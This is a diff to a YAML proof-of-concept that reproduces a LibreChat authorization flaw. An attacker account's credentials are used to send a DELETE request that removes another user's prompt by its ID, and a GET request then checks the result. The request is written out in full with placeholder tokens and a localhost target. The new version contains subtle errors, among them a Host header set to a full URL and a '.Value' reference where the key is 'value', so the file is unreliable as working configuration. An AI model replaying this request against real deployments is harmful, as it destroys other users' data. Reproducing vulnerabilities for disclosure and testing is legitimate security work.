@@ -30,13 +30,15 @@ poc:
         identifier: "6721b4a6d634c1a37a25bf0e"
         type: prompt
     environment:
-      - id: target_host
-        value: "localhost.com:3080" # From report example
-      - id: target_scheme
-        value: "http" # Assuming HTTP based on report URLs
+      # - id: target_host
+      #   value: "localhost.com:8080" # From report example
+      # - id: target_scheme
+      #   value: "http" # Assuming HTTP based on report URLs
+      # - id: target_base_url
+      #   # Use variable substitution to build the base URL
+      #   value: "{{ environment.target_scheme.value }}://{{ environment.target_host.value }}"
       - id: target_base_url
-        # Use variable substitution to build the base URL
-        value: "{{ context.environment.target_scheme.value }}://{{ context.environment.target_host.value }}"
+        value: "http://localhost:8080"
 
   # Global setup phase
   setup:
@@ -44,7 +46,7 @@ poc:
       dsl: "Given the target LibreChat instance is running and accessible"
       action:
         type: check_target_availability
-        url: "{{ context.environment.target_base_url.value }}"
+        url: "{{ environment.target_base_url.Value }}"
         timeout: "5s" # Example of optional execution hint
 
     # In a real automated scenario, these steps would use API calls or UI automation.
@@ -62,7 +64,7 @@ poc:
         description: "Ensure attacker user exists and valid credentials (e.g., Cookie, Bearer) are available via 'attacker_user_credentials' reference."
 
     - step: 4
-      dsl: "And prompt 'victim_prompt' with ID '{{ context.resources.victim_prompt.identifier }}' exists and belongs to 'victim_user'"
+      dsl: "And prompt 'victim_prompt' with ID '{{ resources.victim_prompt.identifier }}' exists and belongs to 'victim_user'"
       action:
         # This could be an API call to create the prompt if needed, or just assumed true.
         type: ensure_resource_exists # Or manual_check
@@ -84,24 +86,24 @@ poc:
           request:
             method: DELETE
             # Construct URL using context variables
-            url: "{{ context.environment.target_base_url.value }}/api/prompts/groups/{{ context.resources.victim_prompt.identifier }}"
+            url: "{{ environment.target_base_url.Value }}/api/prompts/groups/{{ resources.victim_prompt.identifier }}"
             headers:
               # Headers copied from the report, using placeholders for auth tokens
               # Assumes credential resolver provides .cookie and .bearer_token fields
-              Host: "{{ context.environment.target_host.value }}"
-              Cookie: "refreshToken={{ context.users.attacker_user.credentials.cookie }}" # Placeholder resolved externally
+              Host: "{{ environment.target_base_url.Value }}"
+              Cookie: "refreshToken={{ users.attacker_user.credentials.cookie }}" # Placeholder resolved externally
               Sec-Ch-Ua: "\"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"128\""
               Accept: "application/json, text/plain, */*"
               Accept-Language: "en-US,en;q=0.9"
               Sec-Ch-Ua-Mobile: "?0"
-              Authorization: "Bearer {{ context.users.attacker_user.credentials.bearer_token }}" # Placeholder resolved externally
+              Authorization: "Bearer {{ users.attacker_user.credentials.bearer_token }}" # Placeholder resolved externally
               User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36"
               Sec-Ch-Ua-Platform: "\"Windows\""
-              Origin: "{{ context.environment.target_base_url.value }}"
+              Origin: "{{ environment.target_base_url.Value }}"
               Sec-Fetch-Site: "same-origin"
               Sec-Fetch-Mode: "cors"
               Sec-Fetch-Dest: "empty"
-              Referer: "{{ context.environment.target_base_url.value }}/d/prompts/some_referer_id" # Referer from example
+              Referer: "{{ environment.target_base_url.Value }}/d/prompts/some_referer_id" # Referer from example
               Accept-Encoding: "gzip, deflate, br"
               Priority: "u=1, i"
             body: null # No body expected for this DELETE
@@ -136,10 +138,10 @@ poc:
         request:
           method: GET
           # Attempt to retrieve the supposedly deleted prompt
-          url: "{{ context.environment.target_base_url.value }}/api/prompts/groups/{{ context.resources.victim_prompt.identifier }}"
+          url: "{{ environment.target_base_url.Value }}/api/prompts/groups/{{ resources.victim_prompt.identifier }}"
           headers:
             # Use victim's authentication placeholder
-            Authorization: "Bearer {{ context.users.victim_user.credentials.bearer_token }}"
+            Authorization: "Bearer {{ users.victim_user.credentials.bearer_token }}"
             Accept: "application/json"
 
     - step: 2
